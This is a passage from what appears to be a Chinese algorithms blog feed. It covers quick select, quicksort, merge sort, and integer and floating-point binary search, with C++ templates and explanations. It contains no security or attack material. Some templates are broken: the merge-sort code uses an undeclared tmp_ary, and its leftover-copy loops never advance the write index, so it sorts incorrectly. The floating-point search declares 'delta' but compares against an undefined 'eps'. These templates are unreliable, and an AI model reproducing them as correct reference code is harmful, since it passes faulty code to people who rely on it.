class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, k;</span><br><span class="line"><span class="keyword">int</span> q[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">quick_select</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 03.夹挤准则得到最后答案</span></span><br><span class="line">    <span class="keyword">if</span> (l == r) <span class="keyword">return</span> q[l];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = l - <span class="number">1</span>, j = r + <span class="number">1</span>, x = q[l + r &gt;&gt; <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> i ++ ; <span class="keyword">while</span> (q[i] &lt; x);</span><br><span class="line">        <span class="keyword">do</span> j -- ; <span class="keyword">while</span> (q[j] &gt; x);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; j) <span class="built_in">swap</span>(q[i], q[j]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将第k小的数，与划分边界进行比较，因为是提前减去1，所以可以直接比较</span></span><br><span class="line">    <span class="comment">// 不需要调整后再比较</span></span><br><span class="line">    <span class="keyword">if</span> (k &lt;= j) <span class="keyword">return</span> <span class="built_in">quick_select</span>(l, j);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">quick_select</span>(j + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++ ) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提前减1，因为划分后，需要比较边界值，而其划分的边界选择的是闭区间</span></span><br><span class="line">    <span class="comment">// 所以需要提前减1</span></span><br><span class="line">    k -- ;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">quick_select</span>(<span class="number">0</span>, n - <span class="number">1</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="版本03">版本03</h2><p>可以根据01和02可以得到一个版本3：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> ary[N] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">quickSelect</span><span class="params">(<span class="keyword">int</span> ary[], <span class="keyword">int</span> lo, <span class="keyword">int</span> hi, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 03.此时答案集合里面只有一个唯一解，该解就是答案</span></span><br><span class="line">    <span class="keyword">if</span> (lo == hi) &#123;</span><br><span class="line">        <span class="keyword">return</span> ary[lo];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 01.划分区间</span></span><br><span class="line">    <span class="keyword">int</span> left = lo - <span class="number">1</span>, right = hi + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> pivot = ary[left + (right - left) / <span class="number">2</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">do</span> ++left; <span class="keyword">while</span> (ary[left] &lt; pivot);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">do</span> --right; <span class="keyword">while</span> (ary[right] &gt; pivot);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">            std::<span class="built_in">swap</span>(ary[left], ary[right]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 02.由于外面没有减一，需要加1做调整，然后统计左侧数的个数，然后选择合适的区间进行搜索</span></span><br><span class="line">    <span class="keyword">if</span> (right &lt; k - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">quickSelect</span>(ary, right + <span class="number">1</span>, hi, k);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">quickSelect</span>(ary, lo, right, k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>, k = <span class="number">0</span>; </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;ary[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> num = <span class="built_in">quickSelect</span>(ary, <span class="number">0</span>, n - <span class="number">1</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, num);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目要求&quot;&gt;题目要求&lt;/h1&gt;
&lt;p&gt;给定一个长度为&lt;code&gt;n&lt;/code&gt;的整数数列，以及一个整数 &lt;code&gt;k&lt;/code&gt;，求出数列从小到大排序后的第 &lt;code&gt;k&lt;/code&gt;个数。即：从数列中尽可能快的找出第&lt;code&gt;k&lt;/code&gt;小的数。</summary>
      
    
    
    
    <category term="算法" scheme="https://4st.tech/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="快速选择算法" scheme="https://4st.tech/tags/%E5%BF%AB%E9%80%9F%E9%80%89%E6%8B%A9%E7%AE%97%E6%B3%95/"/>
    
    <category term="快速排序" scheme="https://4st.tech/tags/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>基础算法：排序和二分</title>
    <link href="https://4st.tech/2021/05/18/ji-chu-suan-fa-pai-xu-he-er-fen/"/>
    <id>https://4st.tech/2021/05/18/ji-chu-suan-fa-pai-xu-he-er-fen/</id>
    <published>2021-05-18T00:40:17.000Z</published>
    <updated>2021-08-06T09:06:59.310Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大纲">大纲</h1><p>排序：</p><ul><li>快速排序</li><li>归并排序</li></ul><p>二分：</p><ul><li>整数二分</li><li>浮点数二分</li></ul><p>学习方法：</p><ul><li>学习代码的思想</li><li>理解并记忆代码模板</li><li>模板题进行熟练，每道题一般重复3-5次即可。</li></ul><h1 id="排序">排序</h1><h2 id="快速排序">快速排序</h2><h3 id="基本思想">基本思想</h3><p>分治的思想。</p><ol type="1"><li><p>确定分界点（指的是数组中的某一个数，而不是该数对应的数组下标）。随便从数组中找一个数，作为我们的分界点。有几种常用的方法：</p><ul><li>取左边界，q[l]</li><li>取右边界，q[r]</li><li>取中间点，q[(l + r) / 2]</li><li>随机取</li></ul></li><li><p>划分区间。根据上述选取的分界点，将整个数组分成两半，把小于等于分界点的值放到数组的左边，把大于等于分界点的值放到数组的右边。注意要求的是两个部分都是<strong>小于等于</strong>。</p></li><li><p>递归处理，即：重复上述的操作，递归处理左右两个子区间。</p></li></ol><h3 id="快速排序的难点和重点">快速排序的难点和重点</h3><p>在第二个划分区间（调整区间上）。首先要明确目标：通过某一种简单高效的方式，将数组中小于等于分界点的数放到数组的左半边，大于等于分界点的数放到数组的右半边。</p><p>输入的数据是数组的左右两个边界下标，是闭区间<code>[lo, hi]</code></p><p>可以暴力处理，额外的开辟两个数组，将大于等于分界点的数放到一个临时数组中，同时将小于等于分界点的数放到另一个临时数组中。让后将这两个数组合并到原来的数组中即可。</p><p>较为优雅的方法是双指针法：</p><ol type="1"><li>将数组虚拟添加两个哨兵节点。最左侧的哨兵节点为负无穷，最右边的哨兵节点为正无穷，两个指针的初始位置分别指向这两个虚拟哨兵节点，即：</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> left = lo - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> right = hi + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>为什么要这么设置？因为我们在移动的时候不管三七二十一，都是指针先前进一步，然后再进行判断的。所以需要先让出一个位置，避免漏掉需要判断的数据。</p><ol start="2" type="1"><li><p>左侧的指针先行，当其指向的数组中的值小于分界点时，指针继续向右走（因为此时这个数应该位于数组的左半边，不用进行交换等额外操作）；如果指针指向的数组中的值大于等于分界点，此时左侧的指针停下。</p></li><li><p>右侧的指针后行，当期指向的数组中的值大于分界点时，指针继续向左走（因为此时这个数应该位于数组的右半边，不用进行交换等额外操作）；如果指针指向的数组中的值小于等于分界点时，此时右侧的指针停下</p></li><li><p>交换这两个指针指向的数组中的值，并左侧指针和右侧指针分别前进一步，然后继续上述2-3的操作。</p></li></ol><p>为什么上述做法是正确的？假设在任意时刻t，此时观察左侧指针的左半边的数据的情况，其都是小于等于分界点的（因为如果是大于等于分界点的，此时已经交换了；右半边的小于等于分界点的也交换过来了）；同理，右侧指针的右半边的数据都是大于等于分界点的。所以当两个指针相遇或穿过，则满足上述我们的要求。</p><p>描述上述操作的关键点是，终止条件是什么？两个指针相遇或步过。</p><h3 id="递归处理时的注意要点">递归处理时的注意要点</h3><p>在递归处理的时候，只要是对称的进行处理即可，如果写的是<code>right</code>，则右半的起始位置是<code>right + 1</code> ；如果要用<code>left</code>，则左半边是<code>left-1</code> ，而右半边的起始位置就是<code>left</code> 了。</p><p>但是如果你要用<code>left</code> 来做区间划分的边界下标，则需要注意你取的那个分界点不能是左侧边界点，即：<code>ary[left]</code> ，应该是<code>ary[right]</code> 或者其他选取方法（但是一定要上取整，不能取得左边界left这个位置），否则可能会出现边界死循环的问题。同理，如果选择的是<code>right</code> 来做区间划分的边界下标，则需要注意取的分界点不能是右侧边界点。</p><p>为什么会出现死循环呢？举个例子，<code>ary = [1, 2]</code> （递增数列），此时根据上述划分方法，则一个数组是空的，另一个是原数组，问题的规模并没有缩减，从而导致死循环，直到爆栈退出。</p><h3 id="快速排序的一种模板">快速排序的一种模板</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 当数组中只有1个或0个元素时，不需要进行排序，直接返回就好</span></span><br><span class="line">    <span class="keyword">if</span> (lo &gt;= hi) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 指向两个哨兵节点，避免漏过数据</span></span><br><span class="line">    <span class="keyword">int</span> left = lo - <span class="number">1</span>, right = hi + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> pivot = A[(lo + hi) &gt;&gt; <span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 两个指针还没有相遇或者穿过</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> </span><br><span class="line">        &#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125; <span class="keyword">while</span> (A[left] &lt; pivot);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">do</span> </span><br><span class="line">        &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125; <span class="keyword">while</span> (A[right] &gt; pivot);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// left和right指针还未相遇</span></span><br><span class="line">        <span class="keyword">if</span> (left &lt; right)</span><br><span class="line">        &#123;</span><br><span class="line">            std::<span class="built_in">swap</span>(A[left], A[right]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">quick_sort</span>(A, lo, right);</span><br><span class="line">    <span class="built_in">quick_sort</span>(A, right + <span class="number">1</span>, hi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="归并排序">归并排序</h2><h3 id="基本思想-1">基本思想</h3><p>同快速排序一样，是分治思想。</p><ol type="1"><li>确定分界点下标。</li><li>先递归排序左边和右边。这样得到了一系列的有序数组列。</li><li>两两归并为有序数组直到只剩一个数组。</li></ol><h3 id="归并排序中的重点和难点">归并排序中的重点和难点</h3><p>在于归并，即：如何将两个有序的序列合二为一。其实就是比较两个指针指向的两者中的较小者，放到新的一个数组中，直到合并完。</p><p>由于左侧的指针只会扫描左半边，右侧的指针只会扫描右半边。故：两两归并的时间复杂度是O(N)的。</p><p>对于归并排序，其每次都要两两二分，从而期望划分为 <span class="math inline">\(log_2N\)</span> 次，每次合并的时间复杂度是O(N)，故最终的时间复杂度是：<code>O(NlogN)</code></p><h3 id="归并排序的一种模板">归并排序的一种模板</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge_sort</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 当数组中只有1个或0个元素时，不需要进行排序，直接返回就好 </span></span><br><span class="line">    <span class="keyword">if</span> (lo &gt;= hi)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 划分区间</span></span><br><span class="line">    <span class="keyword">int</span> mid = (lo + hi) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 递归排序两边</span></span><br><span class="line">    <span class="built_in">merge_sort</span>(A, lo, mid);</span><br><span class="line">    <span class="built_in">merge_sort</span>(A, mid + <span class="number">1</span>, hi);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 合并两个有序数组到临时数组中</span></span><br><span class="line">    <span class="keyword">int</span> left = lo, right = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> tmp_ary_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= mid &amp;&amp; right &lt;= hi)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (A[left] &lt;= A[right])</span><br><span class="line">        &#123;</span><br><span class="line">            tmp_ary[tmp_ary_idx] = A[left];</span><br><span class="line">           ++left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            tmp_ary[tmp_ary_idx] = A[right];</span><br><span class="line">            ++right;</span><br><span class="line">        &#125;</span><br><span class="line">        ++tmp_ary_idx;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将剩余的部分放到临时数组中</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= mid)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp_ary[tmp_ary_idx] = A[left];</span><br><span class="line">        ++left;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (right &lt;= hi)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp_ary[tmp_ary_idx] = A[right];</span><br><span class="line">        ++right;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将临时数组中的数据拷贝到原数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = lo, j = <span class="number">0</span>; i &lt;= hi; ++i, ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        A[i] = tmp_ary[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二分法">二分法</h1><h2 id="整数二分">整数二分</h2><h3 id="问题的本质">问题的本质</h3><p>二分法与数据的单调性没什么必然的联系，如果要说有的话，那么就是如果数据具有单调性，那么就一定可以二分。但是可以二分的题目，不一定非得要求有单调性。</p><p>本质其实是边界。我们定义一个性质，使得在所给数据集上的左半边满足这个性质，另一半不满足这个性质。如果可以找到这个性质的话，可以把数据一分为二，<strong>那么二分就可以寻找到这个性质的边界（两个分界点都可以找到）</strong>。</p><h3 id="寻找左侧部分的边界点左侧部分的终点">寻找左侧部分的边界点（左侧部分的终点）</h3><p>步骤：</p><ol type="1"><li>找到其中间点，<code>mid = (left + right + 1) / 2</code> ，注意要加1</li><li>检查这个中间点是否满足所给性质（即：左侧部分数据应该满足的性质）<code>if(check(mid))</code><ul><li>如果是<code>true</code>，则<code>mid</code>一定在左侧部分，分界点（答案）应该在右半区间，所以应该将<code>left = mid</code> ，其答案区间应该是：<code>[mid, right]</code>，注意是闭区间。</li><li>如果是<code>false</code>，则<code>mid</code>一定在右侧部分，分界点（答案）应该在左半区间，所以应该将<code>right = mid - 1</code>，其答案区间应该是：<code>[left, mid - 1]</code>，注意是闭区间。（为什么是<code>mid-1</code>？因为<code>mid</code>是一定不满足所给性质的，所以可以将<code>mid</code>给排除掉了）</li></ul></li></ol><h3 id="寻找右侧部分的边界点右侧部分的起始点">寻找右侧部分的边界点（右侧部分的起始点）</h3><p>步骤：</p><ol type="1"><li>找到其中间点，<code>mid = (left + right) / 2</code></li><li>检查中间点是否满足所给性质（即：右侧部分数据应该满足的性质）<ul><li>如果是<code>true</code>，则<code>mid</code>一定在左侧部分，分界点（答案）应该在左半区间，所以应该将<code>right = mid</code> ，其答案区间应该是：<code>[left, mid]</code>，注意是闭区间。（因为mid满足所给性质，所以其答案还是可能在mid这点上的）</li><li>如果是<code>false</code>，则<code>mid</code>一定在右侧部分，分界点（答案）应该在右半区间，所以应该将<code>left = mid + 1</code>，其答案区间应该是：<code>[mid + 1, right]</code>，注意是闭区间。（为什么是<code>mid+1</code>？因为<code>mid</code>是一定不满足所给性质的，所以可以将<code>mid</code>给排除掉了）</li></ul></li></ol><h3 id="如何选择使用哪个方法">如何选择使用哪个方法</h3><p>步骤：</p><ol type="1"><li>先写一个<code>check</code> 函数</li><li>想一下这个<code>check(mid)</code>函数是true或者false的时候如何更新</li><li>如果更新方式是<code>left = mid</code> 和 <code>right = mid - 1</code>，则需要在计算mid时，补上分子的那个1（即：取上整）</li></ol><p>其实核心就是看更新区间到底是<code>left = mid</code> 还是<code>right = mid</code>（在check为<code>true</code>的情况下），如果是<code>left = mid</code> ，则需要mid取上整，需要补偿加1，否则不需要补偿加1.</p><p>需要注意的是，定义一个性质之后，其二分一定是有解的（即：一定有一个边界），但是题目是不一定有解的。</p><h3 id="为什么当check为真时left-mid要补偿加1">为什么当check为真时<code>left = mid</code>要补偿加1</h3><p>当left和right只差1的时候，如果mid不补偿加1的话，那么mid下取整是等于left的，如果此时check为true的，则left还是等于left，此时没有进行更新，从而会出现死循环的情况。</p><h3 id="整数二分的模板">整数二分的模板</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用来检查var是否符合某一性质</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> var)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 区间[left, right]被划分为[left, mid]和[mid + 1, right]时使用</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binary_search</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid) == <span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            right = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 区间[left, right]被划分为[left, mid - 1]和[mid, right]时使用</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binary_search</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid) == <span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            left = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="浮点数二分">浮点数二分</h2><p>这里面就不需要考虑是否需要补偿了，直接就可以二分更新即可。</p><h3 id="浮点数二分模板">浮点数二分模板</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用来检查var是否符合某一性质</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">double</span> var)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">binary_search</span><span class="params">(<span class="keyword">double</span> left, <span class="keyword">double</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 经验值：精度控制比题目所给的精度高-2即可，如：题目要求保留4位，则精度为1e-6即可</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">double</span> delta = <span class="number">1e-6</span>;   </span><br><span class="line">    <span class="keyword">while</span> (right - left &gt; eps)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">double</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid)) </span><br><span class="line">        &#123;</span><br><span class="line">            right = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            left = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;大纲&quot;&gt;大纲&lt;/h1&gt;
&lt;p&gt;排序：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;快速排序&lt;/li&gt;
&lt;li&gt;归并排序&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;二分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;整数二分&lt;/li&gt;
&lt;li&gt;浮点数二分&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;学习方法：</summary>
      
    
    
    
    <category term="算法" scheme="https://4st.tech/categories/%E7%AE%97%E6%B3%95/"/>
    
    
